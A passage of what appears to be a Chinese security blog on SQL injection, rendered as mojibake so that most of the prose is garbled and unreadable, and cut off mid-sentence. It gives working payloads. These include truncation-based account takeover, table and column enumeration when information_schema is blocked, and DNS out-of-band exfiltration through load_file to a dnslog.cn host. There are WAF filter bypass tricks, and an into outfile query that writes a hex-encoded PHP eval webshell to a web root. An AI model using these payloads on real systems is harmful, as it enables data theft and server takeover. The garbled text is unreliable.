title="åŸç†"></a>åŸç†</h6><blockquote><p>åœ¨MySQLçš„é…ç½®é€‰é¡¹ä¸­ï¼Œæœ‰ä¸€ä¸ªsql_modeé€‰é¡¹ã€‚å½“MySQLçš„sql_modeè®¾ç½®ä¸ºdefaultæ—¶ï¼Œå³æ²¡æœ‰å¼€å¯STRICT_ALL_TABLESé€‰é¡¹æ—¶ï¼ŒMySQLå¯¹äºç”¨æˆ·æ’å…¥çš„è¶…é•¿å€¼åªä¼šæç¤ºwarningï¼Œè€Œä¸æ˜¯errorï¼ˆå¦‚æœæ˜¯erroråˆ™æ’å…¥ä¸æˆåŠŸï¼‰ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å‘ç”Ÿä¸€äº›â€œæˆªæ–­â€é—®é¢˜ã€‚</p></blockquote><h6 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â sql-mode=&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot;</span><br></pre></td></tr></table></figure><blockquote><p>Â sql-mode&#x3D;â€STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTIONâ€</p><p>åœ¨strictæ¨¡å¼ä¸‹ï¼Œå› ä¸ºè¾“å…¥çš„å­—ç¬¦ä¸²è¶…å‡ºäº†é•¿åº¦é™åˆ¶ï¼Œå› æ­¤æ•°æ®åº“è¿”å›ä¸€ä¸ªerrorä¿¡æ¯ï¼ŒåŒæ—¶æ•°æ®æ’å…¥ä¸æˆåŠŸã€‚</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æ²¡åŠæ³•åˆ©ç”¨æˆªæ–­æ¥æ³¨å…¥</p></blockquote><p>è¿˜æœ‰ä¸€ä¸ªå‰ç½®æ¡ä»¶:<code>åœ¨sqlæ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ã€‚ä¹Ÿå°±æ˜¯è¯´</code>â€œadminâ€<code>å’Œ</code>â€œadmin â€œ<code>æ˜¯ç›¸ç­‰çš„ã€‚ä¾‹å¦‚ç”¨ä¸€ä¸‹è¯­å¥æŸ¥è¯¢æ—¶ï¼Œä¸ä½¿ç”¨</code>â€œadminâ€<code>è¿›è¡ŒæŸ¥è¯¢æ—¶çš„ç»“æœæ˜¯ä¸€æ ·çš„ã€‚</code></p><h6 id="æ”»å‡»æ‰‹æ³•"><a href="#æ”»å‡»æ‰‹æ³•" class="headerlink" title="æ”»å‡»æ‰‹æ³•"></a>æ”»å‡»æ‰‹æ³•</h6><ul><li>æ”»å‡»è€…æ³¨å†Œåä¸ºâ€™admin xâ€™çš„è´¦æˆ·ï¼Œå¯†ç å¡«å†™è‡ªå·±çš„å¯†ç ï¼Œç”±äºå­—ç¬¦ä¸²è¶…å‡ºé•¿åº¦é™åˆ¶ï¼Œæ•°æ®åº“æŠŠåé¢çš„xæˆªæ–­å¹¶æˆåŠŸæ’å…¥æ•°æ®ã€‚</li><li>æ”»å‡»è€…ç´§æ¥ç€ç™»å½•è‡ªå·±çš„è´¦å·ï¼Œè´¦å·å¯†ç æ ¡éªŒæˆåŠŸï¼Œ<code>return $row[&#39;username&#39;];</code>çš„æ—¶å€™è¿”å›äº†çœŸæ­£çš„adminè´¦æˆ·çš„ä¿¡æ¯ï¼Œé€ æˆè¶Šæƒã€‚</li><li>æ³¨ï¼šå½“ç™»é™†æ—¶ä½¿ç”¨adminä¸è‡ªå®šä¹‰å¯†ç ç™»é™†ï¼Œæ•°æ®åº“å°†è¿”å›æˆ‘ä»¬è‡ªå·±æ³¨<strong>å†Œçš„è´¦æˆ·ä¿¡æ¯</strong>ï¼Œä½†æ˜¯æ³¨æ„æ­¤å¤„çš„<code>return $row[&#39;username&#39;];</code>ï¼Œè™½ç„¶æ­¤æ—¶æŸ¥è¯¢å‡ºæ¥çš„æ˜¯æˆ‘ä»¬è‡ªå·±çš„ç”¨æˆ·ä¿¡æ¯ï¼Œ<strong>ä½†æ˜¯è¿”å›çš„ç”¨æˆ·ååˆ™æ˜¯ç›®æ ‡çš„ç”¨æˆ·åã€‚å¦‚æœæ­¤åçš„ä¸šåŠ¡é€»è¾‘ç›´æ¥ä»¥è¯¥ç”¨æˆ·åä¸ºå‡†ï¼Œåˆ™æˆ‘ä»¬å°±è¾¾åˆ°äº†æ°´å¹³è¶Šæƒçš„ç›®çš„</strong></li></ul><h6 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â 1.å°†è¦æ±‚æˆ–è€…é¢„æœŸå…·æœ‰å”¯ä¸€æ€§çš„é‚£äº›åˆ—åŠ ä¸ŠUNIQUEçº¦æŸï¼Œç”±äº&#x27;username&#x27;åˆ—å…·æœ‰UNIQUEçº¦æŸï¼Œæ‰€ä»¥ä¸èƒ½æ’å…¥å¦ä¸€æ¡è®°å½•ã€‚å°†ä¼šæ£€æµ‹åˆ°ä¸¤ä¸ªç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”INSERTæŸ¥è¯¢å°†å¤±è´¥ã€‚</span><br><span class="line">2.æœ€å¥½ä½¿ç”¨&#x27;id&#x27;ä½œä¸ºæ•°æ®åº“è¡¨çš„ä¸»é”®ã€‚å¹¶ä¸”æ•°æ®åº”è¯¥é€šè¿‡ç¨‹åºä¸­çš„idè¿›è¡Œè·Ÿè¸ªã€‚</span><br><span class="line">Â 3.é™åˆ¶è¾“å…¥é•¿åº¦ã€‚</span><br></pre></td></tr></table></figure><hr><h5 id="information-schemaè¢«ban"><a href="#information-schemaè¢«ban" class="headerlink" title="information_schemaè¢«ban"></a>information_schemaè¢«ban</h5><p><a href="https://blog.csdn.net/qq_43936524/article/details/116796087">å‚è€ƒ</a></p><p>åœ¨å¾—åˆ°ç›®æ ‡æ•°æ®åº“åå­—ä¹‹åï¼Œä¸€èˆ¬ä½¿ç”¨information_schemaå¯ä»¥æŸ¥è¯¢æƒ³è¦çš„è¡¨åï¼Œåˆ—åï¼Œæ•°æ®ã€‚å•æ•°å½“information_schemaè¢«bançš„æƒ…å†µä¸‹ï¼Œæœ‰å…¶ä»–çš„å‡ ä¸ªç³»ç»Ÿè‡ªå¸¦çš„è¡¨ä¸­ä¹Ÿå¯ä»¥è·å¾—æƒ³è¦çš„ä¿¡æ¯ã€‚</p><h6 id="è¡¨å"><a href="#è¡¨å" class="headerlink" title="è¡¨å"></a>è¡¨å</h6><p><strong>sys.schema_auto_increment_columns</strong></p><p>åœ¨mysql 5.7ä»¥åæ–°å¢äº†<code>schema_auto_increment_columns</code>è¿™ä¸ªè§†å›¾å»ä¿å­˜æ‰€æœ‰è¡¨ä¸­<strong>å«æœ‰è‡ªå¢å­—æ®µ</strong>çš„ä¿¡æ¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20210514162941494-1024x154.png"></p><p>å¯ä»¥çœ‹å‡ºä¸ä»…ä¿å­˜äº†<strong>è¡¨åå’Œæ•°æ®åº“å</strong>ï¼Œè¿˜ä¿å­˜äº†è‡ªå¢å­—æ®µçš„<strong>åˆ—å</strong>ã€‚ æ‰€ä»¥å½“æˆ‘ä»¬é€šè¿‡<code>database()</code>è·å¾—æ•°æ®åº“ååå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªè§†å›¾å»è·å¾—å¸¦æœ‰è‡ªå¢åˆ—çš„<strong>è¡¨åå’Œåˆ—å</strong>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â select table_name,column_name from sys.schema_auto_increment_columns where table_schema = &#x27;security&#x27;;</span><br></pre></td></tr></table></figure><p>è€Œå¯¹äºæ²¡æœ‰è‡ªå¢åˆ—çš„è¡¨åï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å…¶ä»–çš„è§†å›¾å»è·å¾—</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â select table_name from sys.schema_table_statistics_with_buffer where table_schema = &#x27;security&#x27;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from sys.schema_table_statistics where table_schema = &#x27;security&#x27;;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ <code>sys.schema_auto_increment_columns</code>è¿™ä¸ªåº“æœ‰äº›å±€é™æ€§ï¼Œä¸€èˆ¬è¦<strong>è¶…çº§ç®¡ç†å‘˜</strong>æ‰å¯ä»¥è®¿é—®sysã€‚</p><blockquote><p>ç±»ä¼¼å¯ä»¥åˆ©ç”¨çš„è¡¨è¿˜æœ‰ï¼š <code>mysql.innodb_table_stats</code>ã€<code>mysql.innodb_table_index</code>åŒæ ·å­˜æ”¾æœ‰åº“åè¡¨å</p></blockquote><h6 id="åˆ—å"><a href="#åˆ—å" class="headerlink" title="åˆ—å"></a>åˆ—å</h6><p><a href="https://blog.csdn.net/qq_31620591/article/details/117067799#:~:text=%E4%B8%80%E7%A7%8D%E5%9F%BA%E4%BA%8Ejoin%E7%9A%84%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%96%B9%E6%B3%95%201%20%E4%BD%BF%E7%94%A8order%20by%20%E7%8C%9C%E8%A7%A3%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%9F%A5%E8%AF%A2%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0,2%20%E6%9E%84%E9%80%A0%E4%B8%8B%E8%BF%B0%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%2C%20%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E5%85%B6%E4%B8%AD%E7%9A%84%E2%80%9C1%E2%80%9D%E9%83%A8%E5%88%86%E4%B8%BA%221%2C2%2C3%2C...%2Cn%22%20%EF%BC%8C%E7%8C%9C%E8%A7%A3%22test%22%E7%9A%84%E5%88%97%E6%95%B0%E3%80%82%20%E5%BD%93%E5%88%97%E6%95%B0%E7%8C%9C%E8%A7%A3%E6%AD%A3%E7%A1%AE%E6%97%B6%EF%BC%8C%E4%BE%BF%E6%88%90%E5%8A%9F%E6%8F%90%E5%8F%96%E4%BA%86test%E8%A1%A8%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">å‚è€ƒ</a></p><p>åœ¨ä¸Šè¿°æ–¹æ³•è·å¾—è¡¨åä¹‹åï¼Œè¿›ä¸€æ­¥è·å¾—åˆ—å</p><blockquote><p><strong>joinæŠ¥é”™å¾—åˆ°åˆ—å</strong></p></blockquote><p>Â select * from (select * from users as a join users b)c;<br>Â â€˜ä¸»è¦ä¾èµ–äºé‡å¤çš„åˆ—åå¯¼è‡´çš„æŠ¥é”™ï¼Œå®ƒä¼šè¿”å›ï¼šDuplicate column nameâ€idâ€â€˜ &#x2F;&#x2F;è¿™ä¸ªæ—¶å€™idå°±æŠ¥å‡ºæ¥äº†<br>Â â€‹<br>Â ç»§ç»­è·å¾—å…¶ä»–çš„<br>Â â€‹<br>Â select * from(select * from users as a join users b uding(id))c; Â  &#x2F;&#x2F;å¾—åˆ°username<br>Â select * from(select * from users as a join usrers b using(id,username))c;<br>Â â€¦ Â  Â  â€˜ç›´åˆ°æ²¡æœ‰æŠ¥é”™ï¼Œå°±è¡¨ç¤ºè·å¾—äº†å…¨éƒ¨åˆ—åâ€™</p><h6 id="sqlmapè·å–"><a href="#sqlmapè·å–" class="headerlink" title="sqlmapè·å–"></a>sqlmapè·å–</h6><p>sqlmapæä¾›äº†æš´åŠ›ç ´è§£è¡¨åçš„çš„é€‰é¡¹â€“common-tablesï¼Œå½“å‡ºç°ä¸€ä¸‹åœºæ™¯çš„æ—¶å€™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â DBMSï¼ˆDatabase Management Systemï¼Œæ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼‰æ˜¯ &lt; 5.0 ç‰ˆæœ¬çš„ MySQLï¼Œå®ƒä»¬ä¸å…·å¤‡ information_schemaã€‚</span><br><span class="line">DBMS æ˜¯å¾®è½¯çš„ Access æ•°æ®åº“ï¼Œå¹¶ä¸”å…¶ä¸­çš„ç³»ç»Ÿè¡¨ MSysObjects é»˜è®¤è®¾ç½®ä¸å¯è¯»ã€‚</span><br><span class="line">Â å½“å‰ä¼šè¯ç”¨æˆ·å¯¹ DBMS ä¸­å­˜å‚¨æ•°æ®è¡¨å®šä¹‰çš„ç³»ç»Ÿè¡¨æ²¡æœ‰è¯»æƒé™ã€‚</span><br></pre></td></tr></table></figure><p>å°±ä¼šé‡‡ç”¨å­—å…¸ä¸­çš„è¡¨åè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œè¡¨åå‚¨å­˜åœ¨sqlmapè·¯å¾„\data\txtä¸­</p><h5 id="æ— åˆ—åæ³¨å…¥"><a href="#æ— åˆ—åæ³¨å…¥" class="headerlink" title="æ— åˆ—åæ³¨å…¥"></a>æ— åˆ—åæ³¨å…¥</h5><p>ä¸Šè¿°information_schemaè¢«banä¹‹åè·å¾—åˆ—åçš„åŠæ³•å°±æ˜¯æ— åˆ—åæ³¨å…¥ï¼Œå®ƒæ˜¯åŸºäºunion, joinçš„æ³¨å…¥æ‰‹æ³•ã€‚</p><p>ä¸€äº›SQLè¯­å¥åŸç†ï¼š</p><blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230509172518255-1024x480.png" style="zoom:67%;" /><p>å‡è®¾ä¸çŸ¥é“åˆ—åï¼Œé€šè¿‡unionæŸ¥è¯¢ï¼Œéœ€çŒœæµ‹åˆ—æ•°ï¼Œè¿™é‡Œä¸º5åˆ—</p><p>Â select 1,2,3,4,5 union select * from table;</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20210329195833956.png" style="zoom:67%;" /><p>æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥ç”¨æ•°å­—æ¥å¯¹åº”åˆ—æŸ¥è¯¢</p><p>Â select `2` from (select 1,2,3,4,5 union select * from table)a;</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20210329200819627-1024x606.png" style="zoom:67%;" /><p>å¦‚æœåå¼•å·è¢«è¿‡æ»¤ï¼ŒåŒæ ·ç»§ç»­ç”¨åˆ«åä»£æ›¿</p><p>Â select c from (select 1,2 as b,3,4 as c,5 as d union select * from table)a;</p><p>Â select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from `table`)a;</p><p><code>0x2d</code>ä¸º<code>-</code></p></blockquote><h5 id="OOBæ³¨å…¥"><a href="#OOBæ³¨å…¥" class="headerlink" title="OOBæ³¨å…¥"></a>OOBæ³¨å…¥</h5><p>SQLiå¯åˆ†ä¸ºä¸‰ä¸ªç‹¬ç«‹çš„ç±»åˆ«ï¼š<strong>inference</strong>ï¼ˆç»å…¸SQLæ³¨å…¥ï¼‰,<strong>inband</strong>ï¼ˆç›²æ³¨ã€æ¨ç†æ³¨å…¥ã€å¸¦å†…æ³¨å…¥ï¼‰å’Œ<strong>out-of-band</strong></p><blockquote><p>out-of-bandå¸¦å¤–æ•°æ®ï¼ˆOOBï¼‰ä¸inbandç›¸åï¼Œå®ƒæ˜¯ä¸€ç§é€šè¿‡å…¶ä»–ä¼ è¾“æ–¹å¼æ¥çªƒå–æ•°æ®çš„æŠ€æœ¯ï¼ˆä¾‹å¦‚åˆ©ç”¨DNSè§£æåè®®å’Œç”µå­é‚®ä»¶ï¼‰ã€‚OOBæŠ€æœ¯é€šå¸¸éœ€è¦æ˜“å—æ”»å‡»çš„å®ä½“ç”Ÿæˆå‡ºç«™TCP&#x2F;UDP&#x2F;ICMPè¯·æ±‚ï¼Œç„¶åå…è®¸æ”»å‡»è€…æ³„éœ²æ•°æ®ã€‚<strong>OOBæ”»å‡»çš„æˆåŠŸåŸºäºå‡ºå£é˜²ç«å¢™è§„åˆ™</strong>ï¼Œå³æ˜¯å¦å…è®¸æ¥è‡ªæ˜“å—æ”»å‡»çš„ç³»ç»Ÿå’Œå¤–å›´é˜²ç«å¢™çš„å‡ºç«™è¯·æ±‚ã€‚è€Œä»åŸŸåæœåŠ¡å™¨ï¼ˆDNSï¼‰ä¸­æå–æ•°æ®ï¼Œåˆ™è¢«è®¤ä¸ºæ˜¯æœ€éšè”½æœ‰æ•ˆçš„æ–¹æ³•ã€‚</p></blockquote><p>e.g:åˆ©ç”¨dnslog.comåœ¨çº¿ç½‘ç«™æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â select load_file(concat(&#x27;//&#x27;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&#x27;.81k8pu.dnslog.cn/abc&#x27;));</span><br></pre></td></tr></table></figure><h3 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h3><ul><li>ä»£ç å±‚<ul><li>é»‘åå•ï¼šå‡½æ•°ï¼Œå…³é”®å­—ï¼Œæ•æ„Ÿå­—ç¬¦</li><li>ç™½åå•ï¼šå‡½æ•°ï¼Œå…³é”®å­—ï¼Œæ•æ„Ÿå­—ç¬¦</li><li>ä½¿ç”¨æˆç†Ÿçš„æ¡†æ¶ï¼Œç”¨å®ƒçš„å®‰å…¨æŸ¥è¯¢æ¥å£</li><li>é‡‡ç”¨é¢„ç¼–è¯‘è¯­å¥é›†PrepareStatementï¼ˆåœ¨phpä¸­ä¸º mysqli-&gt;prepare($sql) å‡½æ•°ï¼‰</li><li>è½¬ä¹‰è¾“å…¥ï¼šPHPå‡½æ•°addslashes()ã€mysqli_real_escape_string()</li><li>è§„èŒƒè¾“å‡ºï¼Œä¸è¾“å‡ºæŠ¥é”™ä¿¡æ¯</li></ul></li><li>é…ç½®å±‚<ul><li>å¼€å¯GPCï¼šè¿‡æ»¤ä¸€äº›é€šç”¨å­—ç¬¦</li><li>ä½¿ç”¨UTF-8ï¼šé˜²æ­¢Unicodeäº§ç”Ÿå®½å­—èŠ‚æ³¨</li></ul></li><li>ç‰©ç†å±‚<ul><li>WAF</li></ul></li></ul><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><h4 id="è¿‡æ»¤"><a href="#è¿‡æ»¤" class="headerlink" title="è¿‡æ»¤"></a>è¿‡æ»¤</h4><p><a href="https://www.cnblogs.com/Fram3/p/15865702.html">å‚è€ƒ</a></p><ul><li>å…³é”®å­—è¿‡æ»¤<ul><li>æœ€å¸¸ç”¨çš„ç»•è¿‡æ–¹æ³•å°±æ˜¯ç”¨<code>/**/</code>ï¼Œ&lt;&gt;ï¼Œåˆ†å‰²å…³é”®å­— <code>sel&lt;&gt;ect</code>æˆ–è€…<code>sel/**/ect</code></li><li>æ ¹æ®è¿‡æ»¤ç¨‹åº¦ï¼Œæœ‰æ—¶å€™è¿˜å¯ä»¥ç”¨åŒå†™ç»•è¿‡<code>selesselectt</code></li><li>å¤§å°å†™ç»•è¿‡ï¼Œä½†ä¸€èˆ¬å¯èƒ½ä¸ä¼šæˆåŠŸ</li><li>ç¼–ç ç»•è¿‡ï¼šurlç¼–ç ï¼Œ16è¿›åˆ¶ç»•è¿‡ï¼ŒASCIIç¼–ç ç»•è¿‡</li></ul></li><li>è¿‡æ»¤é€—å·<ul><li>ç®€å•çš„æ³¨å…¥å¯ä»¥ä½¿ç”¨<strong>join</strong>æ–¹æ³•ç»•è¿‡<code>union select * from (select 1)a join (select 2)b join (select 3)c%23</code></li></ul></li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230509151344442-1024x747.png" style="zoom:67%;" /><p>ï¼ˆlimitä½¿ç”¨fromæˆ–è€…offsetï¼‰ï¼ˆsubsträ½¿ç”¨from forå±äºé€—å·ï¼‰</p><ul><li>è¿‡æ»¤ç©ºæ ¼<ul><li>åŒç©ºæ ¼</li><li>&#x2F;**&#x2F;</li><li>ç©ºæ ¼ -&gt; <strong>%a0</strong> -&gt; <strong>%0a</strong> -&gt; <strong>+</strong> -&gt; <strong>()</strong></li><li>æ‹¬å·ç»•è¿‡</li><li>å›è½¦,Tabä»£æ›¿ &#x2F;&#x2F;å›è½¦çš„ASCIIç æ˜¯chr(13)&amp;chr(10),urlç¼–ç æ˜¯%0d%0a</li></ul></li><li><strong>è¿‡æ»¤å¼•å·</strong><ul><li>ä½¿ç”¨åå…­è¿›åˆ¶ï¼ŒæŠŠè¦ç”¨å¼•å·çš„åœ°æ–¹ç”¨åå…­è¿›åˆ¶</li><li>&#x2F;&#x2F;å®½å­—èŠ‚ç»•è¿‡(å¼•å·è½¬ä¹‰)</li></ul></li><li>è¿‡æ»¤ç­‰å·ç”¨<code>like</code>ä»£æ›¿</li><li>è¿‡æ»¤å¤§å°äºå·ä¸»è¦æ˜¯åˆ©ç”¨å‡½æ•°ä»£æ›¿<ul><li>greatest(n1,n2,n3) &#x2F;&#x2F;è¿”å›å…¶ä¸­çš„æœ€å¤§å€¼</li><li>strcmp(str1,str2) &#x2F;&#x2F;str1å’Œstr2ç›¸ç­‰è¿”å›0ï¼Œå¦åˆ™è¿”å›1æˆ–è€…-1(çœ‹å“ªä¸ªå¤§)</li><li>in æ“ä½œç¬¦</li><li>between and &#x2F;&#x2F;é€‰å–ä»‹äºè¿™ä¸¤ä¸ªå€¼ä¹‹é—´çš„æ•°æ®èŒƒå›´</li></ul></li><li>è¿‡æ»¤ and orç­‰Â and&#x3D;&amp;&amp; or&#x3D; Â  xor&#x3D; Â  not&#x3D;!</li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230409180804266-1024x187.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230509143027423-1024x287.png"></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>SQLæ³¨å…¥è·å¾—shellæœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯å†™æ–‡ä»¶(outfile)ï¼Œä¸€ç§æ˜¯<code>--os-shell</code></p><h5 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile()"></a>into outfile()</h5><h6 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h6><ul><li>æ­¤æ–¹æ³•åˆ©ç”¨çš„å…ˆå†³æ¡ä»¶<ul><li>webç›®å½•å…·æœ‰å†™æƒé™ï¼Œèƒ½å¤Ÿä½¿ç”¨å•å¼•å·</li><li>çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ï¼ˆæ ¹ç›®å½•ï¼Œæˆ–åˆ™æ˜¯æ ¹ç›®å½•å¾€ä¸‹çš„ç›®å½•éƒ½è¡Œï¼‰</li><li>secure_file_privæ²¡æœ‰å…·ä½“å€¼ï¼ˆåœ¨mysql&#x2F;my.iniä¸­æŸ¥çœ‹ï¼‰</li></ul></li></ul><h6 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Â secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥å¯¼å‡º</span><br><span class="line">å½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹</span><br><span class="line">Â å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥å¯¼å‡ºåšé™åˆ¶</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šä¿®æ”¹secure_file_priv çš„å€¼åªèƒ½é€šè¿‡æ‰‹åŠ¨æ‰“å¼€é…ç½®æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨sqlè¯­å¥è¿›è¡Œä¿®æ”¹.</p><ul><li>æŸ¥çœ‹secure_file_privçš„å€¼ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><ul><li>ä¿®æ”¹secure_file_privçš„å€¼ï¼š</li></ul><blockquote><p>åœ¨mysql&#x2F;my.iniä¸­æŸ¥çœ‹æ˜¯å¦æœ‰secure_file_priv çš„å‚æ•°ï¼Œå¦‚æœæ²¡æœ‰çš„è¯æˆ‘ä»¬å°±æ·»åŠ  <strong>secure_file_priv &#x3D; â€˜â€™</strong> å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/22c3072fe00634a17b138868bac8beb8.png"></p></blockquote><h6 id="å†™å…¥shell"><a href="#å†™å…¥shell" class="headerlink" title="å†™å…¥shell"></a>å†™å…¥shell</h6><p>é¦–å…ˆæ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œå°é©¬å»ºè®®åå…­è¿›åˆ¶é˜²æ­¢è¢«wafæ€æ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Â union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile &#x27;C:\\Users\\Administrator.WIN2012\\Desktop\\phpStudy\\WWW\\outfile.php&#x27; --+</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šè¿™é‡Œç½‘ç«™çš„ç›®å½•è¦ä½¿ç”¨<strong>åŒæ–œæ </strong>ä¸ç„¶ä¼šå†™ä¸è¿›å»ï¼Œç¬¬ä¸€ä¸ªæ–œæ æ˜¯è½¬ä¹‰çš„æ„æ€ï¼Œå­—ç¬¦ä¸²è§£æä¸ä»…ä»…å±€é™äºCç¼–è¯‘å™¨ï¼ŒJavaç¼–è¯‘å™¨ã€ä¸€äº›é…ç½®æ–‡ä»¶çš„è§£æã€WebæœåŠ¡å™¨ç­‰ç­‰ï¼Œéƒ½ä¼šé‡åˆ°å¯¹å­—ç¬¦ä¸²è¿›è¡Œè§£æçš„è¿™ä¸ªé—®é¢˜ï¼Œç”±äºä¼ ç»Ÿçš„ Windowsé‡‡ç”¨çš„æ˜¯å•ä¸ªæ–œæ çš„è·¯å¾„åˆ†éš”å½¢å¼ï¼Œå¯¼è‡´åœ¨å¯¹æ–‡ä»¶è·¯å¾„è¿›è¡Œè§£æçš„æ—¶å€™å¯èƒ½å‘ç”Ÿä¸å¿…è¦çš„é”™è¯¯ï¼Œæ‰€ä»¥å°±å‡ºç°äº†ç”¨åŒåæ–œæ <code>\\</code>åˆ†éš”è·¯å¾„çš„å½¢å¼ã€‚ ä¸ç®¡è§£æå¼•æ“æ˜¯å¦å°†åæ–œæ è§£ææˆè½¬ä¹‰å­—ç¬¦ï¼Œæœ€ç»ˆåœ¨å†…å­˜ä¸­å¾—åˆ°çš„éƒ½æ˜¯<code>\</code>ï¼Œç»“æœä¹Ÿå°±ä¸ä¼šå‡ºé—®é¢˜äº†ã€‚</p><blockquote><p>ä¹Ÿå¯ä»¥ç”¨into dumpfile()</p></blockquote><p><strong>into dumpfile() ä¸ into outfile()åŒºåˆ«</strong></p><ul><li>outfileå‡½æ•°å¯ä»¥å¯¼å‡ºå¤šè¡Œï¼Œè€Œdumpfileåªèƒ½å¯¼å‡ºä¸€è¡Œæ•°æ®</li><li>outfileå‡½æ•°åœ¨å°†æ•°æ®å†™åˆ°æ–‡ä»¶é‡Œæ—¶æœ‰ç‰¹æ®Šçš„æ ¼å¼è½¬æ¢ï¼Œè€Œdumpfileåˆ™ä¿æŒåŸæ•°æ®æ ¼å¼</li><li>umpfileé€‚ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå®ƒä¼šå°†ç›®æ ‡æ–‡ä»¶å¸å…¥åŒä¸€è¡Œå†…ï¼›outfileåˆ™æ›´é€‚ç”¨äºæ–‡æœ¬æ–‡ä»¶ã€‚</li></ul><h5 id="os-shell-sqlmap"><a href="#os-shell-sqlmap" class="headerlink" title="--os-shell(sqlmap)"></a>--os-shell(sqlmap)</h5><h6 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a>åŸç†</h6><p>--os-shellå°±æ˜¯ä½¿ç”¨udfææƒè·å–WebShellã€‚ä¹Ÿæ˜¯é€šè¿‡into 